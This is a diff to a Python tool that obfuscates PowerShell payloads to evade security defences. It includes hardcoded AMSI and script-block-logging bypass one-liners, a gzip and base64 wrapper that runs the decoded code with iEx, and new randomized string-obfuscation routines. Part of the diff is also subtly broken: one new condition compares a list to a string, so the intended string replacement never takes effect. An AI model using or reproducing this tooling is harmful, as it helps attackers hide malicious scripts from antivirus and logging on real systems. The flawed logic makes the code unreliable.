@@ -20,6 +20,8 @@ DEBUG = False
 O_DEBUG = False
 O_DEBUG_PATH = './debug_obfu/'
 
+AVAILABLE_STRING_METHODS = []
+
 bypass = [
     """[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)""",
     """[Ref].Assembly.GetType("Management.Automation.Sc"+"riptBlock").GetField("signatures","NonPublic,static").SetValue($null,(New-Object 'Collections.Generic.HashSet[string]'))""",
@@ -97,28 +99,44 @@ def gz(s):
     s = gzip.compress(s)
     return dwrite('''$i=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{0}"));$o=New-Object IO.MemoryStream;$g=New-Object IO.Compression.GzipStream $i,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);iEx([Text.Encoding]::UTF8.'GetString'($o.ToArray()));'''.lower().format(base64.b64encode(s).decode('utf-8')))
 
+
+def remove_quotes(s):
+    if s[0] in ("'",'"') and s[-1] in ("'",'"'):
+        s = s[1:-1]
+    if (s[0] in ("@",) and s[-1] in ("@",)) and s[0] in ("'",'"') and s[-1] in ("'",'"'):
+        s = s[2:-2]
+    return s
+
+def string_obfu_method1(s):
+    ret = "({0})".format('+'.join([ f'[char]{ord(x)}' for x in s]))
+    return ret
+
+def string_obfu_method2(s):
+    ret = "({0}|%{{($_.length-as[char])}})-join''".format( ','.join([f"'{' '*ord(x)}'" for x in s]))
+    return ret
+
+def rand_string_obfu(s,available_methods):
+    m = random.choice(available_methods)
+    log.debug("{0} Chosen for string".format(m.__name__))
+    ret = m(s)
+    return ret
+
+
 def string_obfu(s):
     log.info('Running String Obfuscation')
     if type(s) != str:
         s = s.decode('utf-8')
-    f_strings = []
-    m_strings = []
-    if mfind := re.findall('(@".{10,}?"@)|(@\'.{10,}?\'@)',s,re.DOTALL+re.MULTILINE):
-        [[m_strings.append(a) for a in x if len(a)] for x in mfind]
-        if m_strings:
-            for st in m_strings:
-                n = "({0})".format('+'.join([ f'[char]{ord(x)}' for x in st[2:-2]]))
-                if len(st)>3:
-                    if not '$' in st:
-                        s = s.replace(st,n,1)
-    if find := re.findall('(".*?")|(\'.*?\')',s):
+    f_strings,m_strings,find = [],[],[]
+
+    find.extend(re.findall('(@".{10,}?"@)|(@\'.{10,}?\'@)',s,re.DOTALL+re.MULTILINE))
+    find.extend(re.findall('(".*?")|(\'.*?\')',s))
+    if find:
         [[f_strings.append(a) for a in x if len(a)>2] for x in find]
         if f_strings:
             for st in f_strings:
-                n = "({0})".format('+'.join([ f'[char]{ord(x)}' for x in st[1:-1]]))
-                if len(st)>3:
-                    if '$' not in st:
-                        s = s.replace(st,n,1)
+                n = rand_string_obfu(st, AVAILABLE_STRING_METHODS)
+                if '$' not in st and list(set(st)) == " ":
+                    s = s.replace(st,n,1)
     
     return dwrite(s)
 
@@ -192,7 +210,11 @@ def cmdlet_obfu(s):
 #print(get_cmdlets())
 
 
+AVAILABLE_STRING_METHODS = [
+    string_obfu_method1,
+    string_obfu_method2,
 
+]
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
@@ -232,12 +254,10 @@ if __name__ == "__main__":
     #gzip first makes sure its smaller
     if not args.no_gzip:
         p = gz(p)
-    p = '{0};$x="";{1}'.format(b,string_obfu(p))
+    [(a:=random.choice(funcs), p:=a(p), c.append( str(a.__name__) )) for _ in range(args.rounds)]
+    p = '{0};$x="";{1}'.format(b,p)
     if not args.no_gzip:
         p = gz(p)
-    [(a:=random.choice(funcs), p:=a(p), c.append( str(a.__name__) )) for _ in range(args.rounds)]
-    
-
     print(p)
     log.info("Rounds ran:")
     for r in c:
